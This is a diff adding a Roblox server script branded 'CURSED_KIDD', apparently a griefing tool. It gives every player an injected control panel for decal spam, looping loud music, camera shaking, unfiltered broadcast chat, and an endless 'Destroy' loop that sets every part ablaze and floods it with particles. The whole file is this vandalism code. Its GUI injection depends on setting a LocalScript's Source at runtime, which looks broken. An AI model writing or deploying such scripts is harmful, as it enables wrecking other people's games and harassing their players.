@@ -1,0 +1,91 @@
+-- [[ CURSED_KIDD STANDALONE SERVER SCRIPT ]]
+
+local IMAGE_ID = "rbxassetid://6319951704"
+local MUSIC_ID = "rbxassetid://1839246711"
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
+local Lighting = game:GetService("Lighting")
+
+local remote = ReplicatedStorage:FindFirstChild("CursedKiddEvent") or Instance.new("RemoteEvent", ReplicatedStorage)
+remote.Name = "CursedKiddEvent"
+
+local cursedSound = SoundService:FindFirstChild("CursedMusic") or Instance.new("Sound", SoundService)
+cursedSound.Name = "CursedMusic"; cursedSound.SoundId = MUSIC_ID; cursedSound.Volume = 10; cursedSound.Looped = true
+
+remote.OnServerEvent:Connect(function(player, action, data)
+    if action == "Chat" then
+        remote:FireAllClients("Chat", player.Name, data, player)
+    elseif action == "MusicOn" then cursedSound:Play()
+    elseif action == "MusicOff" then cursedSound:Stop()
+    elseif action == "666" then remote:FireAllClients("Visuals", "666")
+    elseif action == "DecalSpam" then
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                local d = Instance.new("Decal", obj); d.Texture = IMAGE_ID; d.Face = Enum.NormalId.Front
+            end
+        end
+    elseif action == "Destroy" then
+        task.spawn(function()
+            local m = Instance.new("Message", workspace); m.Text = "DESTROYED BY CURSED_KIDD"
+            while true do
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    pcall(function()
+                        if obj:IsA("BasePart") and obj.Name ~= "CURSED" then
+                            obj.Name = "CURSED"; obj.Material = Enum.Material.Neon; obj.Color = Color3.new(1, 0, 0)
+                            local p = Instance.new("ParticleEmitter", obj); p.Texture = IMAGE_ID; p.Rate = 1500
+                            Instance.new("Fire", obj).Color = Color3.new(1, 0, 0)
+                        end
+                    end)
+                end
+                task.wait(2)
+            end
+        end)
+        remote:FireAllClients("Visuals", "Extreme")
+    end
+end)
+
+local function InjectGUI(player)
+    local ls = Instance.new("LocalScript", player:WaitForChild("PlayerGui"))
+    ls.Source = [[
+        local player = game.Players.LocalPlayer
+        local remote = game.ReplicatedStorage:WaitForChild("CursedKiddEvent")
+        local UIS = game:GetService("UserInputService")
+        local Debris = game:GetService("Debris")
+
+        local sg = Instance.new("ScreenGui", player.PlayerGui); sg.Name = "CURSED_KIDD"; sg.ResetOnSpawn = false
+        local main = Instance.new("Frame", sg); main.Size = UDim2.new(0, 220, 0, 320); main.Position = UDim2.new(0.8, 0, 0.4, 0); main.BackgroundColor3 = Color3.fromRGB(20,20,20); main.Active = true; main.Draggable = true
+        Instance.new("UICorner", main)
+        local title = Instance.new("TextLabel", main); title.Size = UDim2.new(1,0,0,35); title.Text = "CURSED_KIDD"; title.TextColor3 = Color3.new(1,0,0); title.BackgroundColor3 = Color3.new(0,0,0); title.Font = Enum.Font.Code
+        local chatList = Instance.new("ScrollingFrame", sg); chatList.Size = UDim2.new(0.25,0,0.25,0); chatList.Position = UDim2.new(0,15,0,15); chatList.BackgroundTransparency = 1; chatList.ScrollBarThickness = 0
+        Instance.new("UIListLayout", chatList).VerticalAlignment = Enum.VerticalAlignment.Bottom
+
+        local function btn(txt, y, act, col)
+            local b = Instance.new("TextButton", main); b.Name = txt; b.Size = UDim2.new(0.9,0,0.1,0); b.Position = UDim2.new(0.05,0,0,y); b.Text = txt; b.BackgroundColor3 = col or Color3.fromRGB(40,40,40); b.TextColor3 = Color3.new(1,1,1); b.Font = Enum.Font.SourceSansBold
+            b.MouseButton1Click:Connect(function() if act then remote:FireServer(act) end end)
+        end
+        btn("666", 50, "666"); btn("DECAL SPAM", 90, "DecalSpam"); btn("MUSIC ON", 130, "MusicOn"); btn("MUSIC OFF", 170, "MusicOff")
+        local input = Instance.new("TextBox", main); input.Size = UDim2.new(0.9,0,0.1,0); input.Position = UDim2.new(0.05,0,0,210); input.PlaceholderText = "MESSAGGIO..."
+        btn("SEND MESSAGE", 250, nil); main:FindFirstChild("SEND MESSAGE").MouseButton1Click:Connect(function() if input.Text ~= "" then remote:FireServer("Chat", input.Text) input.Text = "" end end)
+        btn("DESTROY", 290, "Destroy", Color3.new(0.6,0,0))
+        UIS.InputBegan:Connect(function(k, p) if not p and k.KeyCode == Enum.KeyCode.Slash then task.wait(); input:CaptureFocus() end end)
+
+        remote.OnClientEvent:Connect(function(act, p1, p2, p3)
+            if act == "Chat" then
+                local lbl = Instance.new("TextLabel", chatList); lbl.Size = UDim2.new(1,0,0,20); lbl.BackgroundTransparency = 1; lbl.RichText = true; lbl.Text = "<b><font color='rgb(0,170,255)'>["..p1.."]:</font></b> "..p2; lbl.TextColor3 = Color3.new(1,1,1); lbl.TextXAlignment = Enum.TextXAlignment.Left; chatList.CanvasPosition = Vector2.new(0, 9999)
+                if p3 and p3.Character and p3.Character:FindFirstChild("Head") then
+                    local bg = Instance.new("BillboardGui", p3.Character.Head); bg.Size = UDim2.new(0,200,0,50); bg.StudsOffset = Vector3.new(0,3,0); bg.AlwaysOnTop = true
+                    local f = Instance.new("Frame", bg); f.Size = UDim2.new(1,0,1,0); f.BackgroundColor3 = Color3.new(1,1,1); Instance.new("UICorner", f)
+                    local l = Instance.new("TextLabel", f); l.Size = UDim2.new(1,-10,1,-10); l.Position = UDim2.new(0,5,0,5); l.BackgroundTransparency = 1; l.Text = p2; l.TextScaled = true; Debris:AddItem(bg, 5)
+                end
+            elseif act == "Visuals" then
+                game:GetService("Lighting").Brightness = 5; if p1 == "Extreme" then game:GetService("RunService").RenderStepped:Connect(function() if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.CameraOffset = Vector3.new(math.random(-1,1), math.random(-1,1), math.random(-1,1)) end end) end
+            end
+        end)
+    ]]
+end
+
+Players.PlayerAdded:Connect(InjectGUI)
+for _, p in ipairs(Players:GetPlayers()) do InjectGUI(p) end
+
